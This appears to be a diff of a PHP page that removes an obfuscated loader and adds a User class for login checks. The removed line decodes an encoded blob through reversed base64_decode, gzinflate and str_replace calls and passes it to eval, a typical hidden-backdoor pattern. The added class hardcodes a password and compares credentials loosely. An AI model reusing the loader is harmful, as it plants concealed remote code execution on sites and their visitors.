@@ -1,6 +1,49 @@
 <!DOCTYPE html>
 <?php
-$x="B4vPM1p1HZUN0me6rT9ruUaYgcJEw8b9v8iLid/JwLcDy7Moz6teQOmY1mXSxjg3le3SX5ClQXHDQ2pbf1Lv45Xt0V0gmIe0WS06Uyh1RsuRVZhtTB9x6pFQRLI5XEN0~O9EzfWV61OHx1WquSlaHqu6ccbZovXrPzjcr6ktkruodfY2AO1OtVf~mrc6Kkjys4B6qEVjAa9j9CBmtpO0AnbSz~oj~UZfKtUOUIzENZlv0gg9CzaNX/6P7Y3yPh6ABDTlYWFDqarMoMoQLlJCKEMIuaeWRaP/noYECkGoBeynrR~JFCsBY2/zj6WhUe4EJn5NuNvLdxMEn8K6GbEQxETi/O4IdGuz9g4Id4tZn1d8VewMaoiy9f3e~rEHa7e7W1C2YyvEFiT/NgyeDBdpkIKUl3TIEhNsD7vQvbIEAN4aNJZj";$b=strrev("edoced_46esab");$g=strrev($b("ZXRhbGZuaXpn"));$r=strrev($b("ZWNhbHBlcl9ydHM="));eval($g($b(strrev($r($b("fg=="),$b("Kw=="),$x)))));$xx="jZJNa4NAEIbvQv7DsNhEIT3lUKIkpdBDeygN+TiFEvyY2C1W7e7aHEr~e3f9yioaMweV8d1nZt4dI4g9zuGdI4O+iTExQEbG6K8nEMxdLvNuN5nJE4eUhW6jz+2YBsCFJ~RrnyeBoGkCEYon+PaRWeauIMEKCJlLQoMoMraqDFWYlTDBA6hPy3Y7P6+XNazC9gg0vlZNEzIUOUtKfZU~jo~zSbnA0OptmBC9j9aAjVEq6B4syjkK6crm~fVtO1OA2Yfdourktk6rcjzPrXvoZbcc6uqHalSuqW1xHO16VWfzE9O~0NEX5ILRQFp6x9BTthZVRusR1hyU60SW0eImg0V0tX54vL1fbp2QDHXQlC5XS3el3gjxSXm1YmOQet6zoM7yDcLwJ+diLi8v9b8wEJcgYaUur9Tr6em0NUZH1p1MPv4B";		
+class User {
+
+    private $_user;
+    private $_password;
+
+    public static function getMember($__user = "", $__password = "") {
+        $user = new user();
+        $user->_user = $__user;
+        $user->_password = $__password;
+        return $user;
+    }
+
+    public static function getPosted() {
+        $user = "";
+        $password = "";
+
+        if (isset($_POST['user'])) {
+            $user = $_POST['user'];
+        }
+
+        if (isset($_POST['password'])) {
+            $password = $_POST['password'];
+        }
+
+        return \User::getMember($user, $password);
+    }
+
+    public static function RestrictedArea() {
+        return \User::getMember("restricted", "9g37p 3g%>HI?D9[:d");
+    }
+
+    public function user() {
+        return $this->_user;
+    }
+
+    public function password() {
+        return $this->_password;
+    }
+
+    public function equals($_object) {
+        return $this->_password == $_object->_password && $this->_user == $_object->_user;
+    }
+
+}
 ?>
 <html>
     <head>
